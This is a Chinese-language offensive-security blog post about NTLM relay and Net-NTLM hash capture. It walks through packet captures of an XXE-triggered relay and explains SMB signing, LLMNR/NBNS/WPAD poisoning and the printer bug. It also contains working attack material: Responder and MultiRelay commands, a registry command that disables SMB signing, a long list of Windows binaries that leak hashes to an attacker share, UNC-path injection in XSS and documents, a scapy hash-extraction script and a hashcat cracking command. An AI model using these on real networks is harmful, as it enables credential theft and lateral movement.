---
title: NTLM利用探索
tags: 内网
---

### NTLM 利用探索



本文总结了互联网上对于NTLM的利用方式，并结合原理给出自己的理解。主要抓包分析了XXE触发NTLM认证从而进行Net-NTLM Reflect，并大致总结了其他方式获取Net-NTLM Hash的方式，过程中在不断补充理解，以及涉及到的协议知识。获得Net-NTLM Hach可以破解或者去重放，去中继其他机器。本文的章节顺序其实有些没有条理，因为是一边参考文章一边添加自己的理解而成文的，可能阅读起来有些跳跃，以及需要一些前置知识，不过还是有很多点还是值得阅读的，阅读并思考，相信会有所收获 : )



**注:**本文只探讨利用方式，关于NTLM的原理还需自己参考文章思考理解原理，网上的文章大同小异，这里不再赘述。



SMB通信采用的是**NTLM验证机制**

其实就是中继的Net-NTLM Hash

**进行中继前提**：

1. 目标SMB签名需要关闭，在SMB连接中，需要使用安全机制来保护服务器和客户端之间传输数据的完整性，而这种安全机制就是SMB签名和加密，如果关闭SMB签名，会允许攻击者拦截认证过程，并且将获得hash在其他机器上进行重放，从而获得权限。

2. RID为500，与UAC有关



**SMB签名开放情况**：一般情况下，Windows Server系列会默认开启，而Windows单机系统[win7/8/8.1/10]默认都不会开

不过实际测试，只发现了域控会开启，其他大部分都是关闭。

关闭SMB签名验证的命令： Windows Server系列中RequireSecuritySignature子键默认值为1
`reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f`



查看smb签名是否关闭可以使用Responder工具包里面的`RunFinger.py`或者nmap

`nmap --script smb-security-mode,smb-os-discovery.nse -p445 10.0.6.75 --open`

![屏幕快照 2020-12-02 12.15.41](https://gitee.com/evilashz/MyIMGs/raw/master/img/20201202121552.png)



所以进行攻击前先要用这两种工具对目标的smb签名开放情况进行探测

#### XXE/SSRF

##### 原理分析

MS08-068修复的是，**无法再将`Net-NTLM`哈希值传回到发起请求的机器上，除非进行跨协议转发**

> 在 MS16-075之后微软修复了http->smb的本机relay。所以为了绕过这个限制需要将type2(NTLMSSP_CHALLENGE)Negotiate Flags中的0x00004000设置为0，但是设置为0后会出现另外一个问题那就是MIC验证会不通过，为了绕过这个限制又需要把type2 Negotiate Flags中的Negotiate Always Sign设置为0

**个人理解：**

相当于NTLM认证的双方都是同一台机器，也就是NTLM被封装进了HTTP协议接着通过我们中间人重放Net-NTLM Hash，Relay到本机器的SMB。并且账户的SID为500才可以。成功了相当于我们攻击机器，也就是这个中间人，成功与机器建立SMB认证，建立$IPC，并且DUMP本地的SAM表，从而得到NTLMV2 Hash，因为工作组环境，相当于所有机器都是独立的，每一台的密码只会存到本地的SAM表`c:\windows\system32\config\sam`中，所以对于此类机器我们触发的严格来说，只是NTLM Reflect，更严格的说，只是成功Relay了Net-NTLM hash，相当于(type3)的response`（其实是response中包含Net-NTLM Hash）`，而这个response又是主动认证端的机器使用`用户hash`去加密上一步被认证端机器发送过来的`challenge`，我们在中间只是负责转发，其实客户端和服务端为同一台机器的时候这种攻击应该被叫做`NTLM Reflect`。而在域环境其实也一样，只是被认证端机器需要把这些请求送到DC去处理，因为那里才有用户的hash。



###### 抓包分析：

**1.首先发送XXE请求**

attcker -> victim

触发XXE，测试环境比较敏感 ，这两张图自行脑补...

victim响应401，并开启NTLM认证

触发XXE，测试环境比较敏感 ，这两张图自行脑补...

**2.victim->HTTP NTLMSSP_NEGOTIATE -> hacker**

![屏幕快照 2020-11-26 16.04.48](https://gitee.com/evilashz/MyIMGs/raw/master/img/20201126160509.png)

**3.hacker -> SMB NTLMSSP_NEGOTIATE -> victim**

![屏幕快照 2020-11-26 16.25.57](https://gitee.com/evilashz/MyIMGs/raw/master/img/20201126162636.png)

**4.victim -> SMB NTLMSSP_CHALLENGE -> hacker**(上面的响应)

![屏幕快照 2020-11-26 16.27.51](https://gitee.com/evilashz/MyIMGs/raw/master/img/20201126162908.png)

这里`Negotiate Flags中的0x00004000`和`Negotiate Flags中的Negotiate Always Sign`都为1

**5.hacker -> HTTP NTLMSSP_CHALLENGE -> victim**

重点就在这步在给victim的http应答中将`0x00004000`和`Negotiate Always Sign`都设置为了0

但是本次实验环境都为1，推测应该是没有修复http->smb的relay

也就是没有修复`MS16-075`，对应补丁`KB3164038`

![屏幕快照 2020-11-26 16.42.06](https://gitee.com/evilashz/MyIMGs/raw/master/img/20201126164234.png)

**6.victim-> HTTP NTLMSSP_AUTH ->hacker**

![屏幕快照 2020-11-26 16.43.28](https://gitee.com/evilashz/MyIMGs/raw/master/img/20201126164339.png)

**7.hacker-> SMB NTLMSSP_AUTH ->victim**

![屏幕快照 2020-11-26 16.44.06](https://gitee.com/evilashz/MyIMGs/raw/master/img/20201126164433.png)



最后响应victim 404 ，然后开始IPC$到victim

##### 实战利用

实战利用有可能机器在内网中，而攻击所用到的各种依赖环境并不轻量，也不可能去在目标的中转机器上去安装环境，所以，核心就是需要让主动认证机器能够访问到我们启动的中间人Relay服务。

1. 上线CS Beacon开启VPN(最简单)

2. MSF配合DiverTCPconn

   https://github.com/Arno0x/DivertTCPconn.git

3. ......



**思考：**

域控对外通信，例如ntlm，kerbeose身份验证、活动目录同步等，会使用到ssl/tls加密，所以SMB签名在域控上是开启的状态。`在域内的默认设置是仅在域控制器上启用，域成员机器并没有启用`，这也就是为什么Relay到域控是不行的。

###### 扯点别的：

其实`MS16-075`，这个就是引出很多种Potato的漏洞，就是一个典型的NTLM RELAY利用链，严格说是`跨协议(HTTP -> SMB)的reflection NTLM relay`，发起ntlm认证请求是配合`NBNS投毒欺骗`和`伪造WPAD代理服务器`拿到用户的Net-NTML hash，之前也提到了`MS08-068`虽然限制了同台主机之间smb到smb的Relay，但是并没有限制从http到smb，也就是跨协议的转发。我们配置配合NBNS投毒欺骗和伪造WPAD代理服务器拿到的ntlm请求是http的形式，所以可以直接relay到本机的smb，并且是不要求签名的，除非是域控。

还有一个比较有意思的漏洞是`CVE-2018-8581`

下面会介绍一些涉及到的协议

------

下面谈一些其他对于Net-NTLM Hash的利用：

#### 钓鱼(主动)

各种触发SMB认证的方式其实就是和UNC路径有关，unc路径走的是SMB协议，所以才能对`Net-Ntlmv2`进行抓取

当访问格式为`\\IP\File`的时候，会默认将当前用户密码凭证送到SMB服务进行认证

###### XSS

可以通过在用户经常访问的 Web 网站（已经被我们拿下web权限）上插入 UNC 路径, 例如`<img src="\\192.168.1.2\logo.jpg" />` 以进行 SMB 请求 (当前用户凭据)，发现成功重放攻击，一般来说获取shell不太可能，但是大概率能够拿到Net-Ntlmv2，实在不行也可以进行破解操作

###### 文件包含

<img src="https://gitee.com/evilashz/MyIMGs/raw/master/img/20201202162239.png" alt="img" style="zoom:67%;" />

其实核心还是UNC路径

#### 监听流量(被动): Responder

利用 Responder 来进行` LLMNR`/`NetBIOS-NS` 以及 `WPAD` 欺骗	 **(Responder进行投毒欺骗)**

利用场景，Responder监听内网，获取` LLMNR`/`NetBIOS-NS`的广播，进行投毒。



需要修改`Responder.conf`文件。打开`Responder.conf`文件，将`SMB`和`HTTP`的值改为`off`。这样responder就不会获取hash，而是`Multirelay.py`由的HTTP和SMB去中继。

```
sudo python Responder.py -I en4 -i 10.10.10.10 -r -d -w
```

![屏幕快照 2020-12-03 12.55.05](https://gitee.com/evilashz/MyIMGs/raw/master/img/20201203125717.png)



然后使用我开始提到的两种方式去扫描445端口smb服务的签名情况，然后启动Responder中的MultiRelay

```
python MultiRelay.py -t <target_machine_IP> -u ALL
```



一旦域中的用户尝试访问不存在的share，responder会污染响应消息。`Multirelay.py`会通过获取NTLMv2hash来完成其他动作，并与目标机器相关联。成功中继后就可以获取目标机器上的shell访问权限。

建立shell后还可以执行mimikatz



这里多说一个TIP，可以去Responder的配置文件里先把SMB和HTTP的监听开启，先去看一下内网的广播会抓取到那些用户的Net-NTLM Hash，然后关闭，再修改配置，针对网段的445签名为false的机器发起中继，这里可以用`Responder`中的`Multirelaty也`可以用`Impacket`中的`ntlmrelayx`，或者更多的工具方式，都是可以的，其实一般的relay用smbrelay也是可以的，ntlm镶嵌在什么协议，就称之为xxxrelay，其实统称为ntlmrelay就好。

#### 拓展思路：

触发SMB认证获得Net-NTLM hash的方式/命令：

```
net.exe use \\host\share
attrib.exe \\host\share
bcdboot.exe \\host\share
bdeunlock.exe \\host\share
cacls.exe \\host\share
certreq.exe \\host\share #(noisy, pops an error dialog)
certutil.exe \\host\share
cipher.exe \\host\share
ClipUp.exe -l \\host\share
cmdl32.exe \\host\share
cmstp.exe /s \\host\share
colorcpl.exe \\host\share #(noisy, pops an error dialog)
comp.exe /N=0 \\host\share \\host\share
compact.exe \\host\share
control.exe \\host\share
convertvhd.exe -source \\host\share -destination \\host\share
Defrag.exe \\host\share
DeployUtil.exe /install \\host\share
DevToolsLauncher.exe GetFileListing \\host\share #(this one's cool. will return a file listing (json-formatted) from remote SMB share...)
diskperf.exe \\host\share
dispdiag.exe -out \\host\share
doskey.exe /MACROFILE=\\host\share
esentutl.exe /k \\host\share
expand.exe \\host\share
extrac32.exe \\host\share
FileHistory.exe \\host\share #(noisy, pops a gui)
findstr.exe * \\host\share
fontview.exe \\host\share #(noisy, pops an error dialog)
fvenotify.exe \\host\share #(noisy, pops an access denied error)
FXSCOVER.exe \\host\share #(noisy, pops GUI)
hwrcomp.exe -check \\host\share
hwrreg.exe \\host\share
icacls.exe \\host\share
LaunchWinApp.exe \\host\share #(noisy, will pop an explorer window with the  contents of your SMB share.)
licensingdiag.exe -cab \\host\share
lodctr.exe \\host\share
lpksetup.exe /p \\host\share /s
makecab.exe \\host\share
MdmDiagnosticsTool.exe -out \\host\share #(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)
mshta.exe \\host\share #(noisy, pops an HTA window)
msiexec.exe /update \\host\share /quiet
msinfo32.exe \\host\share #(noisy, pops a "cannot open" dialog)
mspaint.exe \\host\share #(noisy, invalid path to png error)
mspaint.exe \\host\share\share.png #(will capture hash, and display the remote PNG file to the user)
msra.exe /openfile \\host\share #(noisy, error)
mstsc.exe \\host\share #(noisy, error)
netcfg.exe -l \\host\share -c p -i foo
```



1、在共享上放置特殊的目录，当用户点到这个目录的时候会自动请求攻击的SMB

2、在doc或邮件正文里插入文件，然后将相应的链接改为UNC路径（类似这种`\\servername\sharename`格式），通过内网邮件发送给对方

3、利用PDF的GoTobe和GoToR功能让对方打开PDF时自动请求SMB服务器上的文件等等。一般企业内部员工看到内部的邮件或公用共享文件夹会放松警惕，当点开之后，当前用户密码登录凭证已经被人拿到。
参考文章：https://cloud.tencent.com/developer/news/200028

4、metasploit中的`auxiliary/docx/word_unc_injector`会创建一个带有unc路径的word文件，当该文件被打开的时候攻击机器的msf上就会收到Net-NTLMv2 hash，也就是response

-----

下面总结了几个比较感兴趣的实现：

下面这个相当于只是在内网中用netsh中的trace功能，来记录和自己认证用户的Net-NTLM Hash，并不能中继，拿到之后可以进行破解，这里只是一种思路，并且实现方法不用在内网进行部署依赖环境。具体实战中，用到的可能，还需自己分析。

##### 配置文件获取Net-NTLM hash实现：

##### windows平台自带网络抓包方法:

win系统中自带的netsh中的trace功能能够实现不安装任何第三方依赖库，在命令行下进行抓包

适用情况：

- 需要管理员权限
- 支持Win7、Server2008R2及以后的系统，但不支持Server2008

###### 1.开启记录功能

```
netsh trace start capture=yes persistent=yes traceFile="c:\\test\\snmp1.etl" overwrite=yes correlation=no protocol=tcp ipv4.address=192.168.20.1 keywords=ut:authentication
```

参数说明：

```
- capture=yes： 开启抓包功能
- persistent=yes： 系统重启不关闭抓包功能，只能通过Netsh trace stop关闭
- traceFile： 指定保存记录文件的路径
- overwrite=yes： 如果文件存在，那么对其覆盖
- correlation=no： 不收集关联事件
- protocol=tcp： 抓取TPC协议
- ipv4.address=192.168.62.130： 限定只抓和服务器IP相关的数据包
- keywords=ut:authentication： 关键字为ut:authentication
```

###### 2.关闭记录功能

```
Netsh trace stop
```

在关闭之后就会保存成.etl结尾的文件，还会生成一个.cab的文件。但是这里我们转换只需要用到`.etl后缀文件`

###### 3.转换成.cap后缀文件

需要用` windows message analyzer`	转换打开   ` require .net 4.5`

###### 4.通过脚本去筛选文件

现在已经有了.cap格式文件，wireshark可以打开，打开另存为.pcap，这种格式可以用python脚本去筛选

代码如下

```python
#!/usr/bin/env python2.7
import re
try:
      import scapy.all as scapy
except ImportError:
      import scapy

try:
    # This import works from the project directory
      import scapy_http.http
except ImportError:
    # If you installed this package via pip, you just need to execute this
      from scapy.layers import http

packets = scapy.rdpcap('NTLM_2.pcap')
Num = 1
for p in range(len(packets)):

      try:
            if packets[p]['TCP'].dport ==445:
                  TCPPayload = packets[p]['Raw'].load
                  if TCPPayload.find('NTLMSSP') != -1:
                        if len(TCPPayload) > 500:
                              print ("----------------------------------Hashcat NTLMv2  No.%s----------------------------------"%(Num))
                              Num = Num+1
                              print ("PacketNum: %d"%(p+1))
                              print ("src: %s"%(packets[p]['IP'].src))
                              print ("dst: %s"%(packets[p]['IP'].dst))
                              Flag = TCPPayload.find('NTLMSSP')

                              ServerTCPPayload = packets[p-1]['Raw'].load

                              ServerFlag = ServerTCPPayload.find('NTLMSSP')
                              ServerChallenge =  ServerTCPPayload[ServerFlag+24:ServerFlag+24+8].encode("hex")
                              print ("ServerChallenge: %s"%(ServerChallenge))

                              DomainLength1 =  int(TCPPayload[Flag+28:Flag+28+1].encode("hex"),16)
                              DomainLength2 =  int(TCPPayload[Flag+28+1:Flag+28+1+1].encode("hex"),16)*256                             
                              DomainLength = DomainLength1 + DomainLength2
                              #print DomainLength
                              DomainNameUnicode = TCPPayload[Flag+88:Flag+88+DomainLength]
                              DomainName = [DomainNameUnicode[i] for i in  range(len(DomainNameUnicode)) if i%2==0]
                              DomainName = ''.join(DomainName)
                              print ("DomainName: %s"%(DomainName))
                              UserNameLength1 =  int(TCPPayload[Flag+36:Flag+36+1].encode("hex"),16)
                              UserNameLength2 =  int(TCPPayload[Flag+36+1:Flag+36+1+1].encode("hex"),16)*256                             
                              UserNameLength = UserNameLength1 + UserNameLength2
                              #print UserNameLength
                              UserNameUnicode =  TCPPayload[Flag+88+DomainLength:Flag+88+DomainLength+UserNameLength]
                              UserName = [UserNameUnicode[i] for i in  range(len(UserNameUnicode)) if i%2==0]
                              UserName = ''.join(UserName)
                              print ("UserName: %s"%(UserName))

                              NTLMResPonseLength1 =  int(TCPPayload[Flag+20:Flag+20+1].encode("hex"),16)
                              NTLMResPonseLength2 =  int(TCPPayload[Flag+20+1:Flag+20+1+1].encode("hex"),16)*256
                              NTLMResPonseLength = NTLMResPonseLength1 + NTLMResPonseLength2                             
                              # print NTLMResPonseLength
                              NTLMResPonse =  TCPPayload[Flag+140:Flag+140+NTLMResPonseLength].encode("hex")

                              NTLMZONG = packets[p]['Raw'].load.encode("hex")
                              # print NTLMZONG
                              NTLM_FINDALL =  re.findall('3.00000000000000000000000000000000000000000000000000(.*)',NTLMZONG)
                              # print NTLM_FINDALL
                              #print NTLMResPonse
                              print "Hashcat NTLMv2:"
                              print  ("%s::%s:%s:%s:%s"%(UserName,DomainName,ServerChallenge,NTLM_FINDALL[0][:32],NTLM_FINDALL[0][32:632]))
                              # print(NTLMResPonse)

      except:
            pass
```

###### 5.破解NTLM v2 Hash

```
hashcat -m 5600 Administrator::BJ:c3e0054e464f07fa:ee783fa6e8ceff8cb08471f197e65bc6:01010000000000007db2d91678bdd601d89d32f40af504700000000002000a004800410043004b00450001000800570049004e00370004001a006800610063006b0065002e0074006500730074006c006100620003002400770069006e0037002e006800610063006b0065002e0074006500730074006c006100620005001a006800610063006b0065002e0074006500730074006c0061006200070008007db2d91678bdd601060004000200000008003000300000000000000000000000003000004a8fe7c7179152d990b897f672c25cefa677f387edc9f732008c32632721ff420a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00320030002e00310034003100000000000000000000000000 password.list -o found.txt --force
```



在SMB认证中了解到，当我们访问一个目标时会主动向对方发送自己的`用户名和NTLM v2\v1 `进行认证。我们只需要抓取445端口的相关认证信息即可，但是这里有一个问题。就是之前认证成功的用户再来访问我们的时候是不会再次认证的，所以我们获取不了。在第一时间只能获取没有登陆过本机SMB服务的认证信息，或者认证时间过程需要重新认证的这种。



通过抓取自己445端口能够获取未认证用户的v1\v2 Hash，但是想要获取已经能够登录SMB服务账户的NTLM v1\v2 Hash，需要我们再任意获取一台win2012 win7以上的机器，使用445的方法再去监听端口！或者一台PY版本2.7.1 以上的linux。

###### 文件重定向获取NTLM v1\2 Hash

scf文件是"WINDOWS资源管理器命令"文件，是一种可执行文件。里面存在一个lconFile属性，可以填写UNC路径。

就是使用文档管理器访问会执行这个.scf文件

###### NBNS和LLMNR欺骗获得Net-NTLM Hash

下面介绍两个重要的协议，投毒欺骗也就是用到了这两个协议的`广播特性`

###### 1.LLMNR

LLMNR 是一种基于协议域名系统（DNS）数据包的格式，使得两者的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播 DNS。监听的端口为 UDP/5355，支持 IP v4 和 IP v6 ，并且在 Linux 上也实现了此协议。其解析名称的特点为端到端，IPv4 的广播地址为 224.0.0.252，IPv6 的广播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3。

LLMNR 进行名称解析的过程为：

- 检查本地 NetBIOS 缓存
- 如果缓存中没有则会像当前子网域发送广播
- 当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败

也就是说LLMNR并不需要一个服务器，而是采用广播包的形式，去询问DNS

###### 2.NBNS

NetBIOS 协议进行名称解析是发送的 UDP 广播包。因此在没有配置 WINS 服务器的情况底下，LLMNR协议存在的安全问题，在NBNS协议里面同时存在

**windows 解析域名的顺序是**

- Hosts
- DNS (cache / server)
- LLMNR
- NBNS



也就是说，如果在缓存中没有找到名称，DNS名称服务器又请求失败时，Windows系统就会通过`链路本地多播名称解析（LLMNR）`和`Net-BIOS名称服务（NBT-NS）`在本地进行名称解析。这时，客户端就会将未经认证的`UDP`广播到网络中，询问它是否为本地系统的名称，由于该过程未被认证，并且广播到整个网络，从而允许网络上的任何机器响应并声称是目标机器。当用户输入不存在、包含错误或者DNS中没有的主机名时，通过工具(responder)监听LLMNR和NetBIOS广播，攻击者可以伪装成受害者要访问的目标机器，并从而让受害者交出相应的登陆凭证。核心过程与arp欺骗类似，我们可以让攻击机器作中间人，截获到客户端的Net-NTLMHash。

###### 3.WPAD

wpad 全称是Web Proxy Auto-Discovery Protocol ，通过让浏览器自动发现代理服务器，定位代理配置文件PAC(也叫做PAC文件或者wpad.dat)，下载编译并运行，最终自动使用代理访问网络。

默认自动检测设置是开启的。

PAC文件的格式如下

```
function FindProxyForURL(url, host) {
if (url== 'http://www.baidu.com/') return 'DIRECT';
if (host== 'twitter.com') return 'SOCKS 127.0.0.10:7070';
if (dnsResolve(host) == '10.0.0.100') return 'PROXY 127.0.0.1:8086;DIRECT';
return 'DIRECT';
}
```

用户在访问网页时，首先会查询PAC文件的位置，然后获取PAC文件，将PAC文件作为代理配置文件。

查询PAC文件的顺序如下：

1.通过DHCP服务器

2.查询WPAD主机的IP

- Hosts
- DNS (cache / server)
- LLMNR
- NBNS

###### 打印机漏洞

Windows的`MS-RPRN协议`用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的`RpcRemoteFindFirstPrinterChangeNotificationEx()`调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。



任何经过身份验证的`域成员`都可以连接到远程服务器的打印服务`（spoolsv.exe）`，并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。



获得NetNTML Hash的更多方式：

https://www.anquanke.com/post/id/193493#h3-15

https://paper.seebug.org/474/#shellcode



##### 签名

关于签名，其实也是很重要的一个部分，下面要重点分析一下，为什么SMB签名影响了是否能成功Relay

开启SMB签名，会使用一个客户端与服务端(其实网上都在这么命名两端，个人理解来看，其实根本不分客户端服务端，只有发起认证端与被认证端而已，命名为客户端服务端可能会产生误解)，会使用一个两端知道的密钥也就是key，对后续进行加密，攻击者没有key，也就没有办法relay。根据参考daiker师傅在文章中提到的，有三个key在这个过程中参与，这个key其实不是一个，就是共有三个参与。

1. exportedsessionkey

```
def get_random_export_session_key():
return os.urandom(16)
```

这个key是随机数。如果开启签名的话，客户端和服务端是用这个做为key进行签名的。

2. keyexchangekey

这个key使用用户密码，Server Challenge,Client Challenge经过一定运算得到的

3. encryptedrandomsession_key

第一个`exportedsessionkey`，是在客户端生成的随机数，服务端不知道这个key，那就需要进行密钥协商。

使用`keyexchangekey`做为Key,RC4加密算法加密`exportedsessionkey`，来得到`encryptedrandomsession_key`

<img src="https://gitee.com/evilashz/MyIMGs/raw/master/img/20201203134243.png" alt="img" style="zoom:67%;" />

`encryptedrandomsession_key`在传输中，显示为`Session Key`，被认证端拿到用`keyexchangekey`运算得到`exportedsessionkey`，然后进行用这个进行加解密。

对于攻击者来说，作为中间人，由于没有用户的Hash所以没办法参与。

还有要中继到LDAP的话，也和签名是有关的

**本节最后解释一下文章开始说到的，利用条件，为什么RID需要是500**

这个和微软针对PTH出的补丁`kb2871997`有关系，不满足这个条件的登录后是没有权限的

RID 500帐户和本地管理员成员的域帐户是过了UAC的

换句话说，就是管理员组的RID不是500的用户登录后，是没有过UAC的

这个具体比较复杂，又参扯了UAC的知识，只要记住这两个账户就可以

#### 总结

本文，分析了NTLM的多种利用的原理，给出自己的理解。针对性的分析了NTLM认证中的一些点，比如签名，几个关键字段值等。并且总结利用条件，方法等。总结了多种利用方式，供攻击人员参考。也引申了一些提权漏洞的原理。本文并不全面，但是重在强调一些进行攻击的关键点以及引出原理。最后，NTLM Relay也可以结合Kerberos的委派来获取域内机器的权限，其实利用条件更苛刻。本文不再探讨，因为主要还是探讨NTLM协议内的东西。探讨Kerberos的话又会牵扯出一堆关于委派的知识。

**希望有所收获 :)**

